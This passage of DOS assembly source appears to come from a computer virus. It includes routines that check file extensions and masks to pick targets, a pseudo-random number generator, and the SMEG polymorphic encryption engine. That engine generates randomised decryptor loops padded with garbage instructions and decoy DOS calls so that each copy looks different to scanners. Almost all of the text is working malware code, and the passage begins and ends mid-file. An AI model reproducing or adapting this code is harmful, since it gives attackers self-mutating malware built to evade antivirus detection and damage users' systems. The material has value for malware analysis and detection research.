;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;p®¢¥pª  ¯® ¯¥p¥ç­î p áè¨p¥­¨©
check_file_extention:
seach_point:
        lodsb    ;DS:[SI]
        cmp      al,'.'
        jz       point_found
        or       al,al
        jnz      seach_point
point_found:
        lea      di,[bp+extentions-Asciiz]
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+extention-Asciiz],al
        or       al,al
        jnz      check_filemask
        pop      dx
        jmp      set_filemask_zero_exit
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;p®¢¥pª  ¯® ¯¥p¥ç­î ¬ á®ª
check_filemask:
        pop      dx
        pop      ds
        push     ds
        mov      ax,3d00h ;âªpëâì ®¯¨á â¥«ì ¤«ï çâ¥­¨ï
        call     call_int_21
        jc       set_filemask_zero_exit
        push     cs
        pop      ds
        lea      si,[bp+filemasks-Asciiz]
        mov      bx,ax
        mov      byte ptr cs:[bp+filemask-Asciiz],1
next_mask:
        cmp      byte ptr [si],0ffh
        jz       close_file_set_filemask_zero_exit
        cmp      byte ptr [si+2],0f0h
        jnz      no_from_end
        xor      cx,cx
        xor      dx,dx
        mov      ax,4202h
        call     call_int_21
        sub      ax,[si]
        inc      si
        mov      cx,dx
        mov      dx,ax
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_from_end:
        cmp      byte ptr [si+2],0f1h
        jnz      no_win_check
        xor      cx,cx
        mov      dx,[si]
        inc      si
        mov      ax,4200h
        call     call_int_21
        lea      dx,[bp+mask_buffer-Asciiz]
        mov      cl,2
        mov      ah,3fh
        call     call_int_21
        xor      cx,cx
        mov      dx,word ptr cs:[bp+mask_buffer-Asciiz]
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_win_check:
        xor      cx,cx
        mov      dx,word ptr [si]
        mov      ax,4200h
        call     call_int_21
        ;—¨â ¥¬ ¬ áªã ¨ ¯p®¢¥pï¥¬ ¬ áªã
read_and_check_mask:
        lea      dx,[bp+mask_buffer-Asciiz]
        xor      cx,cx
        mov      cl,[si+2]
        mov      ah,3fh
        call     call_int_21
        add      si,3
        push     si
        mov      di,dx
next_letter_of_mask:
        cmp      byte ptr [si],'*'
        jz       next_letter
        cmp      byte ptr [si],'?'
        jnz      letter_is_not_q
        cmp      byte ptr [di],30h
        jl       mask_failed
        cmp      byte ptr [di],39h
        jg       mask_failed
next_letter:
        inc      si
        inc      di
        loop     next_letter_of_mask
        jmp      mask_coincide
letter_is_not_q:
        cmpsb            ;‘p ¢­¨¢ âì DS:[SI] á ES:[DI]
        jnz      mask_failed
        loop     next_letter_of_mask
        ;‘®¢¯ «  ¬ áª 
mask_coincide:
        pop      si
        mov      ah,3eh
        call     call_int_21
        jmp      exit_Asciiz
        ;Œ áª  ­¥ á®¢¯ « 
mask_failed:
        pop      si
        xor      cx,cx
        mov      cl,ds:[si-1]
        add      si,cx
        inc      byte ptr cs:[bp+filemask-Asciiz]
        jmp      next_mask
close_file_set_filemask_zero_exit:
        mov      ah,3eh
        call     call_int_21
set_filemask_zero_exit:
        mov      byte ptr cs:[bp+filemask-Asciiz],0
exit_Asciiz:
        pop      ds es
        popa
        retn
asciiz endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë
;‚å®¤: DS:[SI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª
;      ES:[DI] ¡ §  áâp®ª ¢ ä®p¬ â¥:
;      db  6,'sergey'
;      db  5,'misha'
;      db  0ffh  - p¨§­ ª ª®­æ 
;‚ëå®¤: AX==0 - á®¢¯ ¤¥­¨© ­¥â
;       AX!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨
cmps_string_with_databasestring proc near
        push     di cx
        cld
        xor      cx,cx
        mov      ax,01h
next_string:
        push     si di
        mov      cl,es:[di]
        cmp      cl,0ffh
        jz       no_coincide_string
        inc      di
        rep      cmpsb   ; ‘p ¢­¨¢ âì DS:[SI] á ES:[DI]
        pop      di si
        jz       coincide_string
        mov      cl,es:[di]
        add      di,cx
        inc      di
        inc      ax
        jmp      next_string
coincide_string:
        pop      cx di
        retn
no_coincide_string:
        pop      di si cx di
        xor      ax,ax
        retn
cmps_string_with_databasestring endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
al_to_big_letter:
        cmp      al,61h ;p¥®¡p §®¢ ­¨¥ ¢ ¡®«ìè¨¥ ¡ãª¢ë
        jc       this_is_not_bigletter
        cmp      al,7ah
        ja       this_is_not_bigletter
        sub      al,20h
this_is_not_bigletter:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ASCIIZ.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RANDOM.ASM]ÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; p®£p ¬¬  ®¡p ¡®âª¨ á«ãç ©­®£® ç¨á« 
; ‚å®¤:  OLD_AX
; ‚ëå®¤: 0<=NEW_AX<=OLD_AX
random_any_ax:
        mov      ax,0fffeh
random_ax:
        xchg     ax,dx
        call     random_dx
        xchg     ax,dx
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; p®£p ¬¬  ®¡p ¡®âª¨ á«ãç ©­®£® ç¨á« 
; ‚å®¤:  OLD_DX
; ‚ëå®¤: 0<=NEW_DX<=OLD_DX
random_any_dx:
        mov      dx,0fffeh
random_dx:
        push     ax bx dx
        call     init_rnd_proc
cell_for_rnd_number dw 0100h
init_rnd_proc:
        pop      bx
        imul     ax,word ptr cs:[bx],4dh
        inc      ax
        mov      word ptr cs:[bx],ax
        pop      bx
        inc      bx
        or       bx,bx
        jz       quit_from_rnd
        xor      dx,dx
        div      bx   ;DX:AX / BX  -> AX:DX
quit_from_rnd:
        pop      bx ax
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RANDOM.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SMEG.ASM]ÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
SMEG:
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      ds:[bx+datasize-dataarea_for_SMEG],cx    ; save length to crypt
        mov      ds:[bx+sourceptr-dataarea_for_SMEG],dx   ; save offset to data to crypt
        mov      ds:[bx+targetptr-dataarea_for_SMEG],di   ; save offset to where to put crypted stuff
        add      bx,6
        mov      cx,28h-6h              ; clear the work area with 0's
        push     bx
clear_dataarea:
        mov      [bx],ch
        inc      bx
        loop     clear_dataarea
        ;--------------
        mov      ds:[initialIP-virus],ax       ; store initial IP
        mov      bx,offset(use_regs_tbl-virus)
        mov      ax,23d
        call     random_ax
        xlat     ;AL=[BX+AL]
        pop      bx
        mov      cx,4h
fill_registers:
        xor      dl,dl                   ; fill in which registers
        rcl      al,1                    ; do which job
        rcl      dl,1
        rcl      al,1
        rcl      dl,1
        mov      [bx],dl
        inc      bx
        loop     fill_registers

        mov      byte ptr [bx],5         ; use BP as a garbling register
        inc      bx
        inc      bx
        mov      dx,1h
        call     random_dx
        add      dl,6h
        mov      [bx],dl                 ; register
        xor      dl,1                    ; flip to the other one
        cmp      byte ptr [bx-3],3       ; is it BX?
        jne      is_not_bx
        mov      [bx-3],dl
        mov      dl,3
is_not_bx:
        mov      [bx+1],dl
        mov      dl,[bx-3]
        mov      [bx-1],dl
gen_cryptval:
        call     random_any_dx
        or       dl,dl
        jz       gen_cryptval
        mov      ds:[cryptval-virus],dl        ; store encryption value

        call     random_any_dx           ; get a random value for the
        inc      dx                      ; offset of memory references,
        mov      ds:[ptr_offsets-virus],dx     ; i.e. the XXXX in [bp+XXXX]

        mov      dx,3h
        call     random_dx               ; do the following from
        add      dx,3h                   ; 3..7 times
        xchg     cx,dx
begin_garble:
        push     cx
        call     garble_more
        call     random_ax
        cmp      al,8Ch
        jbe      no_int21
        mov      ax,(number_of_fnc21-1)
        call     random_ax
        add      ax,offset(int21fcns-virus)
        xchg     si,ax
        mov      ah,0B4h
        lodsb
        xchg     ah,al
        stosw    ;AX -> DS:SI
        mov      ax,21CDh
        stosw    ;AX -> DS:SI
no_int21:
        pop      cx
        loop     begin_garble
        mov      al,0E8h
        stosb
        push     di                      ; write garbage for offset
        stosw                            ; of call for now
        call     garble_more             ; encode some garbage
        mov      al,0E9h                 ; encode a JMP
        stosb
        pop      bx
        push     di
        stosw
        push     di
        pop      ax
        dec      ax
        dec      ax
        sub      ax,bx
        mov      [bx],ax                 ; patch CALL to point to
                                         ; space past the JMP where we
        call     garble_more             ; encode a garbage subroutine
        mov      al,0C3h                 ; encode a RETN
        stosb
        pop      bx
        push     di
        pop      ax
        dec      ax
        dec      ax
        sub      ax,bx
        mov      [bx],ax                 ; Make JMP go past subroutine
        call     encode_routine          ; encode the routine!
        mov      si,offset(dataarea_for_SMEG-virus+8)
                                         ; default to using data temp
                                         ; storage register to return
                                         ; to top of loop
        and      al,al                   ; check return code of routine
        jnz      how_to_top
        dec      si                      ; if 0, instead use encryption
        dec      si                      ; value register to return
how_to_top:
        mov      al,75h                  ; encode JNZ
        stosb
        inc      di
        push     di
        call     garble_some
        pop      bx
        mov      al,0E9h                ; encode a JMP
        stosb
        push     di
        inc      di                      ; skip the offset for now
        inc      di
        mov      ax,di
        sub      ax,bx
        mov      [bx-1],al               ; patch the JNZ
        call     garble_some
        call     random_any_ax
        and      ax,3                    ; first entry requires
        add      ax,ax                   ; no register setup, so
        jz       no_setup                ; jmp past it
        push     ax
        mov      al,0B8h
        or       al,[si]                 ; MOV word-reg, XXXX
        stosb
        mov      ax,ds:[loop_top-virus]
        sub      ax,ds:[targetptr-virus]
        add      ax,ds:[initialIP-virus]
        stosw
        call     garble_some
        pop      ax
no_setup:
        add      ax,offset(jmp_table-virus)
        xchg     bx,ax
        mov      bx,[bx]
        call     bx                      ; encode method of returning
        stosw    ;AX->DS:[DI]            ; to the top of the loop
        pop      bx
        mov      ax,di
        sub      ax,bx
        dec      ax
        dec      ax
        mov      [bx],ax
        call     garble_more
pad_paragraph:
        mov      ax,di                   ; pad the decryptor out to the
        sub      ax,ds:[targetptr-virus]       ; nearest paragraph
        and      al,0Fh                  ; do we need to?
        jz       padded                  ; no, we are done
        cmp      al,0Ch                  ; otherwise, still a lot to go?
        ja       one_byte_pad            ; no, do one byte at a time
        call     not_branch_garble       ; else do a nonbranching
        jmp      short pad_paragraph     ; instruction
one_byte_pad:
        call     random_any_ax           ; do a random one byte padding
        call     do_one_byte             ; instruction
        jmp      short pad_paragraph
padded:
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      ax,di
        sub      ax,ds:[bx+targetptr-dataarea_for_SMEG]
        mov      ds:[bx+decryptor_size-dataarea_for_SMEG],ax
        add      ax,ds:[bx+initialIP-dataarea_for_SMEG]
        mov      cx,ds:[bx+pointer_fixup-dataarea_for_SMEG]
        sub      ax,cx
        mov      bx,ds:[bx+pointer_patch-dataarea_for_SMEG]
        mov      [bx],ax
        mov      bl,ds:[crypt_type-virus]      ; get encryption type so
        mov      cl,3                    ; the initial value of the
        ror      bl,cl                   ; counter can be calculated
        and      bx,0Fh
        add      bx,offset(counter_init_table-virus)
        mov      ax,ds:[datasize-virus]
        mov      bx,[bx]
        call     bx
        mov      bx,ds:[counter_patch-virus]   ; patch the value of the
        mov      [bx],ax                 ; counter as needed
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_table:
        dw       offset(write_nothing-virus)
        dw       offset(write_cryptval-virus)
        dw       offset(write_pointer_patch-virus)
        dw       offset(write_counter_patch-virus)
        dw       offset(write_ptr_offset-virus)
        dw       offset(write_dl-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; In the following table, each pair of bits represents a register
; in standard Intel format, i.e. 00 = ax, 01 = cx, 10 = dx, 11 = bx
use_regs_tbl:
        db       00011011b ; ax cx dx bx
        db       11000110b ; bx ax cx dx
        db       10110001b ; dx bx ax cx
        db       01101100b ; cx dx bx ax
        db       11100100b ; bx dx cx ax
        db       00111001b ; ax bx dx cx
        db       01001110b ; cx ax bx dx
        db       10010011b ; dx cx ax bx
        db       01001011b ; cx ax dx bx
        db       11010010b ; bx cx ax dx
        db       10110100b ; dx bx cx ax
        db       00101101b ; ax dx cx bx
        db       11100001b ; bx dx ax cx
        db       01111000b ; cx bx dx ax
        db       00011110b ; ax cx bx dx
        db       10000111b ; dx ax cx bx
        db       00100111b ; ax dx cx bx
        db       11001001b ; bx ax dx cx
        db       01110010b ; cx bx ax dx
        db       10011100b ; dx cx bx ax
        db       11011000b ; dx ax bx cx
        db       00110110b ; ax bx cx dx
        db       10001101b ; bx cx dx ax
        db       01100011b ; cx dx ax bx
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
onebyte_table:
        dec      ax
        inc      ax
        clc
        cld
        cmc
        stc
        inc      ax
        dec      ax
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; high byte holds the opcode, low byte holds the second byte of the
; instruction, i.e. holds the reg/mod, etc. the bottom 2 bits of the low
; byte hold the maximum amount to add to the high byte in creating the
; instruction. This allows one word to generate more than one instruction,
; including the byte or word forms of the instructions
; note that this is reverse of what will be actually stored
garble_table:
        dw       80F1h   ;  XOR reg, XXXX
        dw       3201h   ;  XOR reg, [reg]
        dw      0F6C1h   ; TEST reg, XXXX
        dw       8405h   ; TEST/XCHG reg, [reg]
        dw       80E9h   ;  SUB reg, XXXX        (2 diff encodings)
        dw       2A01h   ;  SUB reg, [reg]
        dw      0D0EBh   ;  SHR reg, 1
        dw       1A01h   ;  SBB reg, [reg]
        dw       80D9h   ;  SBB reg, XXXX
        dw       80D1h   ;  ADC reg, XXXX
        dw      0D0FBh   ;  SAR reg, 1/CL
        dw      0D0E3h   ;  SHL reg, 1/CL
        dw      0D0CBh   ;  ROR reg, 1/CL
        dw      0D0C3h   ;  ROL reg, 1/CL
        dw       8405h   ; TEST/XCHG reg, [reg]
        dw      0D0DBh   ;  RCR reg, 1/CL
        dw      0C6C1h   ;  MOV reg, XXXX
        dw      080C9h   ;   OR reg, XXXX
        dw       0A01h   ;   OR reg, [reg]
        dw      0F6D1h   ;  NOT reg
        dw      0F6D9h   ;  NEG reg
        dw       8A01h   ;  MOV reg, [reg]
        dw      0C6C1h   ;  MOV reg, XXXX
        dw       0201h   ;  ADD reg, [reg]
        dw       80C1h   ;  ADD reg, XXXX
        dw       80FDh   ;  CMP reg, XXXX
        dw       3807h   ;  CMP reg, [reg]       (2 diff encodings)
        dw       80E1h   ;  AND reg, XXXX
        dw      0D0D3h   ;  RCL reg, 1/CL
        dw       2201h   ;  AND reg, [reg]
        dw       1201h   ;  ADC reg, [reg]
        dw       8A01h   ;  MOV reg, [reg]
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
number_of_fnc21=11
int21fcns db     0Dh,19h,2Ah,2Ch,2Eh,30h,3Dh,41h,4Dh,54h,62h
        ;0Dh,2Eh,3Dh,41h,4Dh,54h,62h
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
counter_init_table:
        dw       offset(counterinit0-virus)
        dw       offset(counterinit1-virus)
        dw       offset(counterinit2-virus)
        dw       offset(counterinit3-virus)
        dw       offset(counterinit4-virus)
        dw       offset(counterinit5-virus)
        dw       offset(counterinit6-virus)
        dw       offset(counterinit7-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_table:
        dw      offset(use_as_is-virus)
        dw      offset(fill_mod_field-virus)
        dw      offset(fill_field-virus)
        dw      offset(fill_reg_reg1-virus)
        dw      offset(fill_reg_field-virus)
        dw      offset(fill_mod_n_reg-virus)
        dw      offset(fill_reg_reg2-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_tbl1:
        db       8h,8Ch,0,0C8h,4,0       ; 1 MOV reg0, CS
        db       8h,8Eh,0,0D8h,4,0       ; 2 MOV DS, reg0
        db       7h,0B8h,4,-1,0,2        ; 3 MOV reg7,initial pointer
        db       1h,0B8h,4,-1,0,3        ; 4 MOV reg1,initial counter
        db       57h,8Ah,0,80h,5,4       ; 5 MOV reg2,[reg7+offset]
        db       57h,88h,0,80h,5,4       ; 6 MOV [reg7+offset],reg2
        db       2h,80h,0,0F0h,4,1       ; 7 XOR reg2,cryptvalue
        db       11h,8Bh,0,0C0h,5,0      ; 8 MOV reg2,reg1
        db       78h,30h,0,0,6,0         ; 9 XOR [reg7],reg0
        db       47h,0F6h,0,98h,4,4      ; A NEG [reg7+offset]
        db       47h,0F6h,0,90h,4,4      ; B NOT [reg7+offset]
        db       7,40h,4,-1,0,0          ; C INC reg7
        db       1,48h,4,-1,0,0          ; D DEC reg1
        db       8h,0B0h,4,-1,0,1        ; E MOV reg0,cryptval
        db       10h,33h,0,0C0h,5,0      ; F XOR reg2,reg0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_tbl2:
        db       47h,86h,0,80h,5,4        ; 1 XCHG reg0,[reg7+offset]
        db       8h,40h,4,-1,0,0          ; 2 INC reg0
        db       8h,48h,4,-1,0,0          ; 3 DEC reg0
        db       7h,81h,0,0C0h,4,15h      ; 4 ADD reg7,1
        db       1,81h,0,0E8h,4,15h       ; 5 SUB reg1,1
        db       10h,2,0,0C0h,5,0         ; 6 ADD reg2,reg0
        db       10h,2Ah,0,0C0h,5,0       ; 7 SUB reg2,reg0
        db       47h,0FBh,4,0B0h,4,4      ; 8 PUSH [reg7+offset]
        db       47h,8Fh,0,80h,4,4        ; 9 POP  [reg7+offset]
        db       8h,50h,4,-1,0,0          ; A PUSH reg0
        db       8h,58h,4,-1,0,0          ; B POP reg0
        db       10h,87h,0,0C0h,5,0       ; C XCHG reg2,reg0
        db       2,40h,4,-1,0,0           ; D INC reg2
        db       8,8Bh,0,0C0h,5,0         ; E MOV reg1,reg0
        db       9,23h,0,0C0h,5,0         ; F AND reg1,reg1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine4:
        db       10h
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; INC reg0                      (02)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       13h,24h,0EFh,05h,0F0h,26h,0CDh,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine8:
        db       71h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; NEG [reg7+offset]             (A)
        ; DEC reg1                      (D)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; DEC reg0                      (03)
        ; ADD reg7,1                    (04)
        ; SUB reg1,1                    (05)
        ; DEC reg0                      (03)
        ; SUB reg1,1                    (05)
        ; done                          (-1)
        db       34h,12h,0EEh,0Dh,0ADh,5Fh,60h,30h,40h,50h,30h,50h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine1:
        db       42h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; MOV DS,reg0                   (2)
        ; beginning of loop             (0)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       43h,10h,0CEh,0E0h,0C2h,0,1Fh,68h,80h,0D0h,0D0h,0D0h
        db       30h,0C0h,0E0h,40h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineC:
        db       33h
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; NOT [reg7+offset]             (B)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; XOR reg2,reg0                 (F)
        ; INC reg7                      (C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; XOR reg2,reg0                 (F)
        ; done                          (-1)
        db       14h,23h,0EEh,0Dh,0DBh,5Fh,6Fh,0C0h,20h,20h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineE:
        db       64h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; XOR [reg7],reg0               (9)
        ; MOV reg2,reg1                 (8)
        ; XCHG reg2,reg0                (0C)
        ; INC reg0                      (02)
        ; INC reg2                      (0D)
        ; INC reg0                      (02)
        ; ADD reg7,1                    (04)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; MOV reg1,reg0                 (0E)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       41h,2Eh,3Fh,9h,80h,0C0h,20h,0D0h,20h,40h,20h,20h
        db       0E0h,0D0h,0C0h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine2:
        db       5h
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; XOR reg2,encryption value     (7)
        ; PUSH reg0                     (0A)
